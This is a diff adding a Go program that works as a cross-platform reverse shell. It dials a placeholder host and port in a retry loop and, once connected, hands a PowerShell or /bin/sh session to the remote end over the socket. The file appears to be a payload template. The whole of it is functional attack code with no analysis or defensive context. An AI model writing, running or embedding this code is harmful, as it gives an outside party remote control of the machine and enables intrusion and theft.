@@ -1,0 +1,36 @@
+package main
+
+import (
+	"net"
+	"os/exec"
+	"runtime"
+	"time"
+)
+
+func main() {
+	reverseShell("template-host", "template-port")
+}
+
+func reverseShell(host string, port string) {
+	for {
+		connexion, err := net.Dial("tcp", host+":"+port)
+		if err != nil {
+			time.Sleep(2 * time.Second)
+		} else {
+			connexion.Write([]byte("[+] Connected to " + connexion.LocalAddr().String() + "\n"))
+			if runtime.GOOS == "windows" {
+				spawnShell(connexion, "powershell.exe")
+			} else {
+				spawnShell(connexion, "/bin/sh")
+			}
+			connexion.Close()
+		}
+	}
+}
+
+func spawnShell(connexion net.Conn, shellProgram string) {
+	connexion.Write([]byte("[+] Shell spawned.\n"))
+	shell := exec.Command(shellProgram)
+	shell.Stdout, shell.Stderr, shell.Stdin = connexion, connexion, connexion
+	shell.Run()
+}
